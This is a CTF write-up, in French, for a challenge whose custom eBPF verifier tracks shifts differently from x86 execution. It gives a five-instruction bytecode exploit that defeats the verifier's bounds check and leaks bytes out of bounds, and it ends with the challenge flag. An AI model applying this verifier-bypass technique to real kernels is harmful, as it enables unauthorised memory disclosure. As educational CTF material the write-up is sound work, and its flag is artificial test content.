# the-darknova--ebpf-verifier-mirage (cloud, 300)

## Challenge
**Service :** TLS netcat (`ncat --ssl <host> 1337`)  **Fichier :** `bpf_guard` (ELF64 stripped)
> Un gardien eBPF vérifie chaque instruction… ce qu'on vous laisse voir n'est qu'un mirage de
> télémétrie ; un coffre scellé sommeille hors d'atteinte, *du moins selon les calculs du gardien*.

`bpf_guard` = "Cloud eBPF In-Kernel Verifier & Telemetry Sandbox". On envoie du **bytecode eBPF**
(hex), un **vérificateur custom** le valide, puis un **interpréteur** l'exécute et affiche R0 final.

## Encodage (reversé)
Instruction = 8 octets : `[opcode][dst][src][off_s8][imm_le32]`. Registres R0..R10.
R1 pré-initialisé = **pointeur sur la map/buffer** (`map_size = 0x40 = 64`), type=map pointer.
Opcodes : `0x95`=EXIT, `0xb4/0xb7`=MOV imm, `0xbc/0xbf`=MOV reg, `0x04`=ADD imm,
`0x74`=**RSH dst,src** (shift), `0x71`=**LDXB** `dst = *(u8*)(reg[src] + reg[off])`.

LDXB (vérif) exige : `reg[src]` map pointer, et `reg[off].umax < map_size` sinon « OOB rejected ».

## Le bug — shift modulo 32
Deux passes séparées : la **vérif** suit `umin/umax` par registre ; l'**exécution** calcule les
vraies valeurs. Handler RSH du **vérificateur** :
```
si reg[src].umin >= 32 :  reg[dst].umin = reg[dst].umax = 0   # croit "shift>=32 => 0"
sinon :                   umin >>= src.umax ; umax >>= src.umin
```
Mais l'**exécution** fait `shr eax, cl` → x86 **masque cl à 5 bits** → `shr by 32 == shr by 0`
→ **valeur inchangée**. Divergence : après `RSH R2, (R3=32)`, le vérificateur croit `R2.umax=0`
(passe le check OOB) alors que la valeur réelle de R2 est **conservée**.

## Exploit (leak OOB byte-at-a-time)
```
MOV R2, idx       ; b7 02 00 00  <idx le32>
MOV R3, 32        ; b7 03 00 00  20 00 00 00
RSH R2, R3        ; 74 02 03 00  00 00 00 00   -> vérif: R2.umax=0 ; exéc: R2 reste idx
LDXB R0, [R1+R2]  ; 71 00 01 02  00 00 00 00   -> lit buffer[idx] (OOB autorisé)
EXIT              ; 95 ...
```
Dump du buffer : offset 0 = leurre `NCTF{ebpf_map_lookup_decoy_entry}` ; **offset 64 (=map_size)
= le vrai flag**. (`solve` : `ebpf_client.py` + boucle leak, voir repo.)

## Flag
`NCTF{77ad08bc7abee9a3de785d69}`
